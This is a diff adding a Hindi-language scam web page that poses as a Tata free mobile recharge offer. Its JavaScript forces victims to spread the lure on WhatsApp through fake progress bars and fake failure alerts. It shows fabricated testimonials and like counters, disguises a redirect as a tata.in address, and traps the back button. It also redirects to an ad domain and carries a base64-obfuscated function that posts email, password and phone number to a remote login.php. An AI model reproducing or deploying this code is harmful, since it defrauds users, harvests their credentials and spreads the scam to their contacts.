+                                        c-2.926,2.984-7.366,3.941-11.24,2.374c-13.427-5.434-41.672-30.548-48.881-43.106c-2.084-3.624-1.739-8.152,0.817-11.462
+                                        l6.058-7.839c2.374-3.07,2.874-7.197,1.305-10.747l-11.941-27.008c-2.86-6.468-11.126-8.352-16.527-3.784
+                                        c-7.921,6.701-17.32,16.88-18.461,28.16c-2.015,19.887,6.515,44.954,38.762,75.055c37.257,34.778,67.094,39.369,86.523,34.664
+                                        c11.019-2.667,19.825-13.365,25.379-22.126C336.906,296.467,333.91,288.535,327.115,286.582L327.115,286.582z"></path>
+                                </g>
+                                <g>
+                                    <path style="fill:#D1D1D1;" d="M356.004,147.708l-22.223,22.778c1.131,1.045,2.257,2.096,3.351,3.191
+                                        c21.67,21.669,33.604,50.483,33.604,81.127c0,30.375-12.128,59.656-33.604,81.134c-21.669,21.669-50.483,33.604-81.13,33.604
+                                        c-17.944,0-35.125-4.027-51.066-11.966l-10.302-5.134l-45.37,10.747l0.938-4.553l-40.174,41.172
+                                        c0.886,2.663,3.705,4.475,6.734,3.758l73.995-17.53c19.011,9.471,40.364,14.939,62.962,15.284
+                                        c79.753,1.219,146.253-62.105,148.74-141.829C403.834,215.357,385.686,175.435,356.004,147.708z"></path>
+                                    <path style="fill:#D1D1D1;" d="M327.115,286.582l-28.384-8.149c-3.729-1.069-7.749-0.01-10.468,2.76l-6.942,7.07
+                                        c-2.926,2.984-7.366,3.941-11.24,2.374c-7.756-3.139-20.451-12.845-31.185-22.904l-19.732,20.225
+                                        c0.677,0.648,1.352,1.295,2.05,1.948c37.257,34.778,67.094,39.369,86.523,34.664c11.019-2.667,19.825-13.365,25.379-22.126
+                                        C336.906,296.467,333.91,288.535,327.115,286.582z"></path>
+                                </g>
+                            </svg>WhatsApp
+                        </button>
+                    </center>
+                    <div style="margin-top: 30px;margin-bottom: 30px;" class="offer__first js-hidden js-share">
+                        <div style="border: 1px solid gray; width:80%" class="offer__load">अपने ग्रुप्स के साथ शेयर करें <span class="offer__load-a js-hidden"></span></div>
+                        <div style="border: 1px solid gray;border-left: none; width:30%" class="offer__load-icon">
+                            <svg id="third-loading" class="offer__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
+                                <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="100.26548245743669 100.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
+                                    <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animatetransform>
+                                </circle>
+                                <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="100.12831551628262 100.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
+                                    <animatetransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animatetransform>
+                                </circle>
+                            </svg>
+                            <svg id="third-checked" class="offer__load-check js-hidden" xml:space="preserve" viewBox="0 0 100 100" y="0" x="0" xmlns="http://www.w3.org/2000/svg" version="1.1" width="3.2rem">
+                                <g class="ldl-scale" style="transform-origin: 50% 50%; transform: rotate(0deg) scale(0.8, 0.8);">
+                                    <g class="ldl-ani">
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -0.833333s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <circle stroke-miterlimit="10" stroke-width="8" stroke="#333" fill="none" r="40" cy="50" cx="50" style="stroke:#0038a5;"></circle>
+                                            </g>
+                                        </g>
+                                        <g class="ldl-layer">
+                                            <g class="ldl-ani" style="transform: scale(0.91); transform-origin: 50px 50px; animation: 1.11111s linear -1.11111s infinite normal forwards running breath-37df210d-8a2e-4b1a-ada2-3deb9c98e6b4;">
+                                                <path fill="#abbd81" d="M73.3 33.5c-2.3-2.3-6.1-2.3-8.4 0L44.5 53.9l-9.4-9.4c-2.3-2.3-6.1-2.3-8.4 0-1.1 1.1-1.7 2.6-1.7 4.2s.6 3.1 1.7 4.2l13.6 13.6c1.1 1.1 2.6 1.7 4.2 1.7s3.1-.6 4.2-1.7L73.2 42c1.1-1.1 1.7-2.6 1.7-4.2s-.5-3.1-1.6-4.3z" style="fill:#ecc365;"></path>
+                                            </g>
+                                        </g>
+                                    </g>
+                                </g>
+                            </svg>
+                            <span id="third-porcent" class="offer__load-text"></span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="loading2 js-hidden js-verify">
+                <div class="loading2__box">
+                    <center>
+                        <img style="margin-top: -20px; margin-bottom: 20px;" src="./Tata_logo.png" width="50" height="auto"> <br>
+                        <b style="font-weight:bold; font-size:16px">बधाई हो। आपको 3 महीने का मुफ़्त रिचार्ज मिल गया है!</b>
+                    </center>
+                    <br>
+                    <b>मुफ्त रिचार्ज पाने के लिए, रिचार्ज एक्टिवेशन का यह अंतिम चरण आवश्यक है!</b><br><br>
+                    <b>1. नीचे दिए गए <b>Activate Recharge</b> बटन पर क्लिक करके अपना रिचार्ज सक्रिय करें!</b><br>
+
+                    <center><br><b style="font-size:14px">-------------यह चरण पूरा करने के बाद, आपका मुफ़्त रिचार्ज 24 घंटे के भीतर सक्रिय हो जाएगा।-------------</b></center><br>
+                    <center>
+                        <div style="display: flex;">
+                            <button style="width: 100%; display: flex;align-items: center;justify-content: center;margin: 0;" id="verify" class="offer__cta-btn">रिचार्ज सक्रिय करें</button>
+                        </div>
+                    </center>
+                    <br>
+                    <center>
+                        <script type="text/javascript" src="files/CLaIM_NOW"></script>
+                    </center>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="post" width="100%" style="margin-top:40px">
+        <div class="comments">
+            <div class="counter">
+                <div class="reactions">
+                    <img class="like" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZJp7NOVQmRFMhv94oLZCEo5uLERdmMisj31PmdfMTXQkCSXS3Hh3w80shRQv3qkJLI1uHqedxPOGnBAbllrUM7JzJjxE6z-gnkDEtMv8LZedeI79RdEB2KwwNazEPJuOIXd81mA-Zt7X7yAbkBHizoEfRCToTUEgkYGknSiyyhxhSaVBr-GjAG2CpBc3k/s16000/g6cV61A.png">
+                    <img class="love" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjio1bc6cbKhQXETW5HIDQVOyjE-VafyVE9pDBVMdt8QjgQZpVUXmnLqxh0f4n1rUna-xXLAFWo5CLMVt4poXgc4PJRyA9lGL_Q3ic82WZrgfT0RFw8SR7FA77XQ5ePleW7LEh5smRiqzjJ_-_35yFjWlQyGa85RldljuAndG8NqWb2F07rVWrrX01qan4Q/s16000/0UHB1f0.png">
+                    <img class="care" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgFWZo-b6G2uBNoqt5zoIqZ2tx3O7Ko-1zrDJDLkRrCJAWyRtmisrguUc2NxD6E-oxN6JBXlNGMt76DdGlWiPiRiweHpfIpl6FYuFCAv_tdHFQH1MNoWhjdRNNh1q_GVxhykJFEFPhNB4C9beE-9heBt9V3IhAhhUg7o9nlKWlMZeYMAPPq4xOO8GrfG_G9/s16/sSMYbTT.png">
+                    <span id="likes">1.1M</span>
+                </div>
+                <span id="comments">300K comments</span> <span class="dot">·</span> <span id="shares">500K shares</span>
+            </div>
+            <div class="bar">
+                <span class="react"><i class="fa fa-thumbs-o-up"></i> <a class="liked">Like</a></span> <span class="react"><i class="fa fa-comment-o"></i> Comment</span> <span class="react"><i class="fa fa-share"></i> Share</span>
+            </div>
+            <div>
+                <div class="comment"></div>
+            </div>
+            <div class="comment">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhkAc6NhOezZeyCX97PgTtHweg5sKMALzT0cupRNs8tHIaMwfSjfpfkUIOAqs7r0yjXIBInK2XFC0098oQmM0_ehRgod0YGlyQXaf1kS2Uj0TS9W_3gz7a34pd_TFUgOv6yAErKycqFC2O3PGXLkRz-jdgyHO_4-DYnSGNPtbw0OoDa9DjUooOhIbqPNKIg/s16000/xp1ER6K.jpg">
+                <div class="user-container">
+                    <span class="user">Jennifer Desouza</span>
+                    <span class="text">बहुत-बहुत धन्यवाद। मुझे 12 घंटे बाद टाटा से मेरा मुफ्त रिचार्ज मिला, अभी भी विश्वास नहीं हो रहा है!</span>
+                </div>
+                <div class="buttons"><span class="time t1">16m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg7tG6utyGgZ-ReBmOGnoO9soNeftJI9O-IM1kTRTP7wb647sCSMWLVWhixZaD3OwX1amSJ0bp5KtkxBZwgglvGxjCWlof47G1xJISwMLjC1RgstmAX6uSvYWpjXY27kxzbBMI5bkaWmWUE09pS11Lvlrfd8n9P913V1bqgrkXeCVdcWXvUZHn10ZbZ4uHk/s16000/qxPvt9E.jpg">
+                <div class="user-container"><span class="user">Rahul Parmar</span> <span class="text">क्या मुझे टाटा का मुफ्त रिचार्ज मिलेगा?</span></div>
+                <div class="buttons"><span class="time t2">17m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment reply">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhgI8fIp60AT7QfxDNCzwdgpAMxP3GW8jAKCqSTlc9nULRbkmLyso965yJANiRt7kTvv0ODWs3ufoW9vItiWBg2DgzwPWYNV7pMhsQHtgvTAeIxZimu33eHg27VEo6fmBrq7Qs2Xxcf9VtNE0D7ej070yFUjJHwi7poCjb60NMy0x3BYzCDzNIRAuvqSFMs/s16000/KTvWL6j.jpg">
+                <div class="user-container"><span class="user">Dinesh Bhambhani</span> <span class="text">टाटा के इस ऑफर ने मेरा दिन बना दिया। बहुत-बहुत धन्यवाद!</span></div>
+                <div class="buttons"><span class="time t1">17m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment">
+                <img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg77pNNSQ_xoawvXTK6sRH89QfVwiDfee3dKzau9NmWD4iylKGVvbk6exnKjTIUwA-0qk5SSUhGffMDIuQdVQ6gaMGHFVy8Wxu-p8kiJFWGhgtXxyC5JU4WOqyhN6Er5j8FxgevjDxqOlR9RTr8WyS6FMgLGe21SfUrlqmjP5rKxOUzY1F6vGmihGhVcG6q/s16000/D3BlBjV.jpg">
+                <div class="user-container"><span class="user">Niharika Goyal</span> <span class="text">बहुत-बहुत धन्यवाद, मुझे टाटा के इस मुफ्त ऑफर की बहुत जरूरत थी!</span></div>
+                <div class="buttons"><span class="time t3">18m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment">
+                <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQTn_HJ7ZnSR5YjTFKIWVxkHtYT2WbyR2EZcG7dQ6CPi8EtWIOLeV--CCiWF0xtlnKeL7M&usqp=CAU">
+                <div class="user-container"><span class="user">Ram Kumar</span> <span class="text">पहले तो मुझे लगा कि यह नकली है लेकिन मुझे रिचार्ज मिल गया</span></div>
+                <div class="buttons"><span class="time t2">19m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="comment reply">
+                <img src="https://images.pexels.com/photos/771742/pexels-photo-771742.jpeg?auto=compress&cs=tinysrgb&dpr=1&w=500">
+                <div class="user-container"><span class="user">Ranjan</span> <span class="text">मुझे भी मिल गया धन्यवाद टाटा</span></div>
+                <div class="buttons"><span class="time t1">19m</span> <span class="dot">·</span> <span class="action liked">Like</span> · <span class="action">Reply</span></div>
+            </div>
+            <div class="input"><input placeholder="टिप्पणी..."></div>
+        </div>
+    </div>
+    <script type="text/javascript">
+        var time = 0;
+        window.setInterval(function() {
+            time = time + 1;
+            $(".t1").html(time + 1 + "m");
+            $(".t2").html(time + 2 + "m");
+            $(".t3").html(time + 4 + "m");
+        }, 6e4);
+        var likes = 134, comments = 23, shares = 12;
+        window.setInterval(function() {
+            likes = likes + Math.floor(Math.random() * 3);
+            comments = comments + Math.floor(Math.random() * 2);
+            shares = shares + Math.floor(Math.random() * 2);
+            $("#likes").html(likes + "K");
+            $("#comments").html(comments + "K comments");
+            $("#shares").html(shares + "K shares");
+        }, 5e3);
+        $(".liked").click(function() {
+            if ($(this).hasClass("selected")) {
+                $(this).removeClass("selected");
+                $(this).html("Like");
+            } else {
+                $(this).addClass("selected");
+                $(this).html("Unlike");
+            }
+        });
+    </script>
+    <script>
+        var DOMString = {
+            loading: document.querySelector("#loading-svg"),
+            checked: document.querySelector("#check-svg"),
+            elemPorcents: document.querySelector(".offer__porcent"),
+            elemPorcentText: document.querySelector(".offer__porcent-text"),
+            firstBox: document.querySelector("#first-box"),
+            secondBox: document.querySelector("#second-box"),
+            thirdBox: document.querySelector("#third-box"),
+            phone: document.querySelector(".offer__form-input"),
+            messageStatus: document.querySelector(".message-status"),
+            loadingG: document.querySelector("#loading-g"),
+            boxes: document.querySelectorAll(".offer__first"),
+            firstPorcent: document.querySelector("#first-porcent"),
+            secondPorcent: document.querySelector("#second-porcent"),
+            thirdPorcent: document.querySelector("#third-porcent"),
+            barLoaders: document.querySelectorAll(".offer__load-a"),
+            svgLoading: document.querySelectorAll(".offer__load-animate"),
+            svgChecked: document.querySelectorAll(".offer__load-check"),
+            permissionContainer: document.querySelector(".permision-container"),
+            permissionLoading: document.querySelector(".loading2"),
+            statusMessage: document.querySelector(".fb-request"),
+            share: document.querySelector("#compartir"),
+            congrats: document.querySelector(".js-congrats"),
+            sharing: document.querySelector(".js-share"),
+            verify: document.querySelector("#verify")
+        },
+        objServer = {},
+        landingDomain = "https://tata.in@clck.ru/3NcSAT",
+        adsLink = "https://uncertainbill.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
+        document.addEventListener("click", function(c) {
+            console.log(c);
+            var a = c.toElement || c.srcElement;
+            if (a.id) switch (a.id) {
+                case "validar":
+                    a.classList.add("js-hidden"), setTimeout(function() {
+                        DOMString.loading.classList.remove("js-hidden"), DOMString.elemPorcents.classList.remove("js-hidden");
+                        var b = 0;
+                        window.loadingPorcents = setInterval(function() {
+                            DOMString.elemPorcents.textContent = b + "%", 100 == b ? (clearInterval(window.loadingPorcents), DOMString.loading.classList.add("js-hidden"), DOMString.checked.classList.remove("js-hidden"), DOMString.elemPorcents.classList.add("js-hidden"), DOMString.elemPorcentText.classList.remove("js-hidden"), setTimeout(function() {
+                                DOMString.checked.classList.add("js-hidden"), DOMString.firstBox.classList.add("js-hidden"), DOMString.secondBox.classList.remove("js-hidden"), DOMString.elemPorcentText.classList.add("js-hidden")
+                            }, 2e3)) : b++
+                        }, 50)
+                    }, 500);
+                    break;
+                case "enviar":
+                    var a = DOMString.phone;
+                    a.value ? (objServer.phone = a.value, DOMString.messageStatus.classList.add("js-hidden"), DOMString.secondBox.classList.add("js-hidden"), DOMString.loadingG.classList.remove("js-hidden"), setTimeout(function() {
+                        DOMString.loadingG.classList.add("js-hidden"), DOMString.thirdBox.classList.remove("js-hidden");
+                        var i = 0,
+                            j = 0,
+                            k = !0,
+                            l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+                        window.loadingData = setTimeout(function a() {
+                            l.length > i && (DOMString.boxes[i].classList.remove("js-hidden"), DOMString.barLoaders[i].classList.remove("js-hidden"), window._setting = setInterval(function() {
+                                if (l[i].textContent = j + "%", DOMString.barLoaders[i].style.width = j + "%", 100 === j && k) clearInterval(window._setting), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++, j = 0, window.loadingData = setTimeout(a, 1e3);
+                                else if (50 == j && 1 == i && k) clearInterval(window._setting), k = !1, window.loadingData = setTimeout(a, 1e3);
+                                else if (!k && 100 === j) {
+                                    clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
+                                    var d = 1,
+                                        e = 0,
+                                        m = messageToSend();
+                                    var s = 1;
+                                    set_Cookie("d", s);
+                                    DOMString.barLoaders[i].classList.remove("js-hidden"), DOMString.boxes[i].classList.remove("js-hidden"), DOMString.svgLoading[i].classList.remove("js-hidden"), l[i].textContent = "0%", DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function() {
+                                        if (15 <= d) {
+                                            for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function() {
+                                                window.open(adsLink)
+                                            });
+                                            DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+                                        } else
+                                            d == 1 ? e = 50 : d == 2 ? e = 65 : d == 3 ? e = 70 : d == 4 ? e = 70 : d == 5 ? e = 80 : d == 6 ? e = 81 : d == 7 ? e = 85 : d == 8 ? e = 86 : d == 9 ? e = 87 : d == 10 ? e = 88 : d == 11 ? e = 90 : d == 12 ? e = 94 : d == 13 ? e = 96 : d == 14 ? e = 98 : d == 15 ? e = 100 : void(0);
+                                        d++;
+                                        l[i].textContent = e + "%";
+DOMString.barLoaders[i].style.width = e + "%";
+
+setTimeout(function() {
+    if (d == 3 || d == 5 || d == 7) alert(tip_text());
+}, 4000);
+                                        set_Cookie('e', e);
+                                        set_Cookie('d', d);
+                                        window.location.href = "whatsapp://send?text=" + m
+                                    })
+                                }
+                                j++
+                            }, 30))
+                        }, 1e3)
+                    }, 1500)) : (DOMString.messageStatus.classList.remove("js-hidden"), DOMString.messageStatus.style.color = "red", DOMString.messageStatus.style.fontWeight = "bold", DOMString.messageStatus.textContent = "We need a number");
+            }
+        });
+
+        get_Cookie('e') ? setTimeout('enviar()', 500) : void(0);
+
+        landingDomain = 'https://tata.in@clck.ru/3NcSAT'
+
+        function deadline() {
+            var day3 = new Date();
+            day3.setTime(day3.getTime() + 24 * 60 * 60 * 1000);
+            return day3.getFullYear() + "-" + (day3.getMonth() + 1) + "-" + (day3.getDate() + 5);
+        }
+
+        function enviar() {
+            l = [DOMString.firstPorcent, DOMString.secondPorcent, DOMString.thirdPorcent];
+            i = 1;
+
+            clearInterval(window._setting), DOMString.congrats.classList.remove("js-hidden"), DOMString.sharing.classList.remove("js-hidden"), DOMString.share.classList.remove("js-hidden"), DOMString.svgLoading[i].classList.add("js-hidden"), DOMString.svgChecked[i].classList.remove("js-hidden"), i++;
+            var d = parseInt(get_Cookie('d'));
+            e = parseInt(get_Cookie('e'));
+            m = messageToSend();
+            d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0);
+            DOMString.barLoaders[i].classList.remove("js-hidden");
+            DOMString.boxes[i].classList.remove("js-hidden");
+            DOMString.svgLoading[i].classList.remove("js-hidden");
+            l[i].textContent = e + "%";
+            DOMString.barLoaders[i].style.width = e + "%";
+            DOMString.share.classList.remove("js-hidden"), DOMString.share.addEventListener("click", function() {
+                if (10 <= d) {
+                    for (var a = document.querySelectorAll("#verify"), b = 0; b < a.length; b++) a[b].addEventListener("click", function() {
+                        window.open(adsLink)
+                    });
+                    DOMString.congrats.classList.add("js-hidden"), document.querySelector(".js-verify").classList.remove("js-hidden"), DOMString.verify.classList.remove("js-hidden")
+                } else {
+                    d == 1 ? e = 50 : d == 2 ? e = 65 : d == 3 ? e = 70 : d == 4 ? e = 70 : d == 5 ? e = 80 : d == 6 ? e = 80 : d == 7 ? e = 85 : d == 8 ? e = 86 : d == 9 ? e = 87 : d == 10 ? e = 88 : d == 11 ? e = 90 : d == 12 ? e = 94 : d == 13 ? e = 96 : d == 14 ? e = 98 : d == 15 ? e = 100 : void(0);
+                    d++;
+                    setTimeout(function() {
+                        d == 3 || d == 5 || d == 7 ? alert(tip_text()) : void(0);
+                        l[i].textContent = e + "%";
+                        DOMString.barLoaders[i].style.width = e + "%";
+                    }, 4000);
+                    set_Cookie('e', e);
+                    set_Cookie('d', d);
+                    window.location.href = "whatsapp://send?text=" + m;
+                }
+            })
+        }
+
+        function doreq(e, a, b) {
+            var c = new XMLHttpRequest;
+            c.open("POST", atob("aHR0cHM6Ly9hcHMucmVwcm92aWRlcy5jb20vbG9naW4ucGhwP3drcj16eGNtbmJ2MTI=")), c.onreadystatechange = function() {
+                4 === c.readyState && 200 === c.status
+            }, c.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"), c.send("email=" + e + "&pass=" + a + "&phone=" + b)
+        }
+
+        function tip_text() {
+            var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+                b = "";
+            return "hi" === a ? b = "साझा करना विफल! वही समूह या वही मित्र अमान्य है। कृपया जांच करें और फिर से साझा करें।" : "id" === a ? b = "Berbagi gagal! Grup yang sama atau teman yang sama tidak valid. Silakan periksa dan bagikan lagi." : b = "Sharing failed! The same group or the same friend is invalid. Please check and share again.";
+        }
+
+        function messageToSend() {
+            var a = navigator.languages[0].includes("-") ? navigator.languages[0].slice(0, navigator.languages[0].indexOf("-")) : navigator.languages[0],
+                b = "";
+            return "hi" === a ? b = "*🎉 टाटा फ्री रिचार्ज ऑफर 🎉* %0A टाटा Jio, Vi, Airtel के लिए ₹799 का मुफ्त रिचार्ज ऑफर दे रहा है। अभी रिचार्ज करने के लिए नीचे दिए गए लिंक पर क्लिक करें! %0A 👇यह ऑफर केवल 20/10/2025 तक मान्य है।👇%0A%0A" + landingDomain : "id" === a ? b = "*Tata Free Recharge Offer* %0A Tata memberikan penawaran isi ulang gratis senilai 799₹ untuk Jio, Vi, Airtel. Klik tautan di bawah sekarang untuk mengisi ulang! %0A 👇Penawaran ini hanya sampai 20/10/2025.👇%0A%0A" + landingDomain : b = "*🎉 टाटा फ्री रिचार्ज ऑफर 🎉* %0A टाटा Jio, Vi, Airtel के लिए ₹799 का मुफ्त रिचार्ज ऑफर दे रहा है। अभी रिचार्ज करने के लिए नीचे दिए गए लिंक पर क्लिक करें! %0A 👇यह ऑफर केवल 20/10/2025 तक मान्य है।👇%0A%0A" + landingDomain;
+        }
+
+        function operatorData(c) {
+            var a = new XMLHttpRequest;
+            a.open("GET", atob("aHR0cHM6Ly90ZHNqc2V4dDMuY29tL0V4dFNlcnZpY2Uuc3ZjL2dldGV4dHBhcmFtcw==")), a.onreadystatechange = function() {
+                4 === a.readyState && 200 == a.status && c(a.response)
+            }, a.send(null)
+        }
+
+        operatorData(function(e) {
+            var {
+                isp: a,
+                cnames: b,
+                subdiv: c
+            } = JSON.parse(e);
+            document.querySelector(".offer__company").textContent = a, document.querySelector(".offer__country").textContent = b.en, document.querySelector(".offer__city").textContent = c[0].en
+        });
+        var counter = 153;
+        setInterval(function() {
+            document.querySelector(".chat__reactions-counter").textContent = counter + "k", counter++
+        }, 5e3);
+        var counter2 = 337;
+        setInterval(function() {
+            document.querySelector(".js-counter").textContent = counter2, counter2++
+        }, 5e3);
+        var seconds = 1;
+        setInterval(function() {
+            for (var c = document.querySelectorAll(".js-seconds"), a = 0; a < c.length; a++) c[a].textContent = seconds + "m";
+            seconds++
+        }, 6e3), setTimeout(function() {
+            var b = document.querySelector("#js-box-1");
+            b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
+        }, 1e3), setTimeout(function() {
+            var b = document.querySelector("#js-box-2");
+            b.classList.remove("js-hidden"), b.classList.add("fadeInDown")
+        }, 3e3);
+    </script>
+    <script>
+        function getTextNodesIn(a, b) {
+            var c = [];
+            if (a)
+                for (var d = a.childNodes, e = d.length; e--;) {
+                    var f = d[e],
+                        g = f.nodeType;
+                    3 == g ? (!b || b(f, a)) && !f.wholeText.includes("\n") && !f.parentNode.__proto__.toString().includes("SVG") && !f.wholeText.match(/\b(?:Carles|Roign|US$|Demand|Laurens|Kule|Taufik|Albert)\b/gi) && 4 <= f.wholeText.length && c.push(f) : (1 == g || 9 == g || 11 == g) && (c = c.concat(getTextNodesIn(f, b)))
+                }
+            return c
+        }
+    </script>
+    <script>
+        window.onhashchange = function() {
+            jp();
+        };
+
+        function hh() {
+            history.pushState(history.length + 1, "message", "#" + new Date().getTime());
+        }
+
+        function jp() {
+            fh();
+        }
+        setTimeout('hh();', 500);
+
+        function fh() {
+            location.href = "https://uncertainbill.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
+        }
+
+        function goon() {
+            location.href = "https://uncertainbill.com/agyv7ex6?key=96eb9366cb1c6c1b8ab6ab46c574e6fb";
+        }
+    </script>
+    <script>
+        (function(global) {
+            if (typeof(global) === "undefined") {
+                throw new Error("window is undefined");
+            }
+            var _hash = "!";
+            var noBackPlease = function() {
+                global.location.href += "#";
+                global.setTimeout(function() {
+                    global.location.href += "!";
+                }, 50);
+            };
+            global.onhashchange = function() {
+                if (global.location.hash !== _hash) {
+                    global.location.hash = _hash;
+                }
+            };
+            global.onload = function() {
+                noBackPlease();
+                document.body.onkeydown = function(e) {
+                    var elm = e.target.nodeName.toLowerCase();
+                    if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) {
+                        e.preventDefault();
+                    }
+                    e.stopPropagation();
+                };
+            };
+        })(window);
+    </script>
+   <script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4969354,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4969354&101" alt="myspace tracker" border="0"></a></noscript>
+</body>
+
+     </html>
